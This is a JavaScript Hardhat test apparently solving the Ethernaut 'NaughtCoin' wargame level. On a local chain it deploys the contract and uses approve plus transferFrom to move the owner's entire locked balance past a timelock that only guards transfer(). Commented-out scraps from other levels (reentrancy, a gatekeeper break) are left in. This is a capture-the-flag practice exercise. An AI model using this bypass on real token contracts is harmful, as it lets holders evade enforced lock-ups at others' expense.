const {expect} = require('chai');
const {ethers, waffle} = require('hardhat');

describe('NaughtCoin', function () {
	it('should break', async function () {
		const [owner, knower] = await ethers.getSigners();
		console.log('owner.address', owner.address);

		const NaughtCoin = await ethers.getContractFactory('NaughtCoin');
		const naughtCoin = await NaughtCoin.deploy(owner.address);
		await naughtCoin.deployed();

		// const GK2Break = await ethers.getContractFactory('GK2Break');
		// const gk2Break = await GK2Break.deploy(gk2.address);
		// await gk2Break.deployed();

		// await knower.sendTransaction({
		// 	to: reentrance.address,
		// 	value: ethers.utils.parseEther('0.001'),
		// });

		// let ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBal', ethBal);

		await (
			await naughtCoin.approve(owner.address, '1000000000000000000000000')
		).wait();

		await (
			await naughtCoin.transferFrom(
				owner.address,
				knower.address,
				'1000000000000000000000000'
			)
		).wait();

		console.log('entrant', await naughtCoin.balanceOf(knower.address));

		// await (await dr.attack('1000000000000000')).wait();

		// ethBal = await waffle.provider.getBalance(reentrance.address);
		// console.log('ethBalAfter', ethBal);
		// let y;
		// for (let x = 0; x < 4294967296; x++) {
		// 	if ((x % 256 == x % 65536) == 8806) {
		// 		console.log('X:', x);
		// 	}
		// }
	});
});
